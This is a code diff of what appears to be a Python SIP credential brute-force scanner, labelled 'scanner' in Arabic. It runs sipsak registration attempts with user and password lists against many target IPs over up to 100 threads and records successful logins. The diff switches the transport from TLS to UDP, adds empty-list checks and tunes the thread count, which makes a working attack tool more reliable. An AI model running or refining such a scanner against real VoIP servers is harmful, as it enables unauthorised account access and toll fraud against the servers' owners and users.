@@ -13,7 +13,7 @@ success_results = "success_results.txt"
 
 def register_user(user, password, target):
     # Execute the sipsak command to register the user based on the user and password and the target
-    cmd = f"sipsak -U -C sip:{user}@home.com --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E TLS"
+    cmd = f"sipsak -U --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E udp"
     result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     # Check the result for a successful 200 OK response
@@ -42,9 +42,24 @@ def main():
     with open(ip_file, "r") as targets_file:
         targets = targets_file.readlines()
 
+    # Remove any empty or whitespace-only lines from targets list
+    targets = [target.strip() for target in targets if target.strip()]
+
+    if not users or not targets:
+        print("Error: User/Password or Targets lists are empty or file not found.")
+        return
+
     # Create a list of threads
     threads = []
-    num_threads = 1000
+    num_threads = 100
+
+    # Make sure targets list is not empty
+    if len(targets) < 1:
+        print("Error: Targets list is empty.")
+        return
+
+    if len(targets) < num_threads:
+        num_threads = len(targets)
 
     # Split the list of targets into chunks for each thread
     targets_chunked = [targets[i:i + len(targets) // num_threads] for i in range(0, len(targets), len(targets) // num_threads)]
@@ -61,8 +76,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
 
 
 ==============================  سكانر ===========================================
